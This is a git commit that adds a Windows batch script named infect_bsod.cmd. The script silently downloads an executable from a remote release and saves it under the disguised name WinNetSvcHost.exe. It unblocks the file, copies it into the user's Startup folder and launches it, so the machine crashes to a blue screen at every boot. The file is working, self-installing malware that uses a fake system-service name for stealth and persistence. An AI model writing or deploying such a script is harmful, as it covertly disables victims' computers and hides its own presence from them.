b96c0a7954e0b8fe1750a6441719ec1e5e6987cd
ultrapg <marvinspath9261@gmail.com>
2026-05-15 17:14:49 +0200

    Add script to download and execute QuickBSOD
    This script downloads and sets up QuickBSOD to run at startup.

--- infect_bsod.cmd
+++ infect_bsod.cmd
@@ -1,1 +1,7 @@
-
+@echo off
+set "dlurl=https://github.com/jpiechowka/quick-bsod/releases/download/1.0/QuickBSOD.exe"
+curl -L -o "%TEMP%\WinNetSvcHost.exe" %dlurl% >nul 2>&1
+powershell -c "Unblock-File -Path $env:TEMP\WinNetSvcHost.exe" >nul 2>&1
+mkdir %LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\ >nul 2>&1
+copy "%TEMP%\WinNetSvcHost.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WinNetSvcHost.exe"
+start "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WinNetSvcHost.exe"
